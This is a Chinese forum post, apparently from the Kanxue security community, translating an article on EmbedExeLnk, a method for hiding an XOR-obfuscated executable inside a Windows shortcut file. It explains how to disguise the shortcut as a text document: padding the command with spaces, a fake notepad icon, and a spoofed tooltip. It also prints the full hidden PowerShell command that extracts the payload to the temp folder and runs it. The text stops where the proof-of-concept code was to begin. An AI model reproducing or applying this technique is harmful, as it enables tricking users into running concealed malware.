
# [翻译]`EmbedExeLnk` - 在LNK内嵌入EXE并自动执行

翻译

原文地址：09eK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2^5z5o6k6E0j5i4c8@1K9r3g2%4i4K6u0W2j5$3!0E0i4K6u0r3N6X3W2W2N6#2)9#2k6Y4m8G2M7%4c8Q4x3@1k6A6k6q4)9K6c8r3g2E0j5X3g2V1i4K6g2X3k6i4S2W2i4K6g2X3L8r3&6C8

功能：在LNK内嵌入EXE并自动执行

---

我已经在自然环境下看到了各种恶意的LNK文件。这些链接文件通常执行一个脚本（`Powershell`、`VBScript`等），下载一个外部payload。

我给自己设定的挑战是创建一个内嵌EXE文件的LNK文件，而不需要外部下载。

这是通过创建一个LNK文件来实现的，EXE文件被附加到最后。LNK文件执行一些`Powershell`命令，从LNK的末尾读取EXE的内容，将其复制到`%TEMP%`文件夹中的一个文件，并执行它。

我开发了一个程序，从目标EXE文件中创建一个LNK。

这种方法遇到一些问题：

1. 找到LNK文件的文件名。

    当执行`Powershell`命令从LNK中提取EXE时，我们不知道已经执行的LNK文件的文件名。我们可以对文件名进行硬编码，但这不是一个可靠的解决方案。通过在`Powershell`命令中存储LNK文件的总大小，并检查当前目录中的所有`\*.LNK`文件，以找到一个具有匹配文件大小的文件来解决这个问题。

2. 找到LNK中EXE数据的偏移量。

    这一点通过在`Powershell`命令中存储原始LNK文件的长度（不包括附加的EXE数据）来解决。

3. 在查看LNK文件的“属性”时，`Powershell`命令是可见的。

    这一点通过在目标字段前加上512个空格字符得到了解决。这使“属性”对话框中的文本字段溢出，只显示空格。

    ![](https://bbs.kanxue.com/upload/attach/202202/767964_QVSTT6AM4HGZXZX.jpg)

4. LNK文件有一个可执行文件的图标。

    通过将图标位置（使用`HasIconLocation`标志）设置为“`%windir%\system32\notepad.exe`”来解决这个问题。

    ![](https://bbs.kanxue.com/upload/attach/202202/767964_HP3AVGPMDM56AZQ.jpg)

5. 悬停在LNK文件上的位置显示为`cmd`。

    ![](https://bbs.kanxue.com/upload/attach/202202/767964_XDVATS748M3QE9H.jpg)

    通过将快捷方式描述（使用“名称”标志）设置为“`Type: Text Document\nSize: 5.23 KB\nDate modified: 01/02/2020 11:23`”。

    ![](https://bbs.kanxue.com/upload/attach/202202/767964_D5U8M7TKV62CVPC.jpg)

6. 在十六进制编辑器中打开LNK文件时，EXE文件清晰可见。

    通过使用`XOR`对EXE文件数据的每个字节进行“加密”，并使用`Powershell`对其进行“解密”，这一点得到了改善。

完整的LNK目标看起来像这样。

```
cmd /c powershell -windowstyle hidden $lnkpath = Get-ChildItem *.lnk ^| where-object {$_.length -eq [TOTAL_LNK_FILE_SIZE]} ^| Select-Object -ExpandProperty Name; $file = gc $lnkpath -Encoding Byte; for($i=0; $i -lt $file.count; $i++) { $file[$i] = $file[$i] -bxor 0x77 }; $path = '%temp%\tmp' + (Get-Random) + '.exe'; sc $path ([byte[]]($file^| select -Skip [LNK_FILE_SIZE_EXCLUDING_EXE])) -Encoding Byte; ^& $path;
```

下面是完整的概念验证程序代码：
